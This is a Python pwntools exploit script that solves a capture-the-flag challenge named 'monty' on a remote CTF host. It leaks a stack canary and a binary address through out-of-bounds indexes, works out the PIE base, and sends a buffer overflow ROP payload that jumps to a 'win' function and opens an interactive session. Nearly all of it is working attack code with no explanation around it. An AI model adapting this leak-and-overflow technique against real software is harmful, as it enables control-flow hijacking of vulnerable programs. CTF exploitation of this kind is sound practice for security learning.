#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './monty'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chall.lac.tf', 31132

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    io.sendlineafter(b'? ', f'{-449}'.encode())
    io.recvuntil(b': ')
    canary = int(io.recvline().strip(), 10)
    log.info("Canary val: %#x", canary)
    
    io.sendlineafter(b'? ', f'{-19}'.encode())
    io.recvuntil(b': ')
    leaked_elf = int(io.recvline().strip(), 10)
    log.info("Leaked val: %#x", leaked_elf)
    elf.address = leaked_elf - 0x2030
    log.info("ELF base: %#x", elf.address)

    io.sendlineafter(b'! ', b'69')

    offset = 24
    payload = flat({
        offset: [
            canary,
            rop.ret.address,
            elf.sym['win']
        ]
    })
    io.sendlineafter(b': ', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()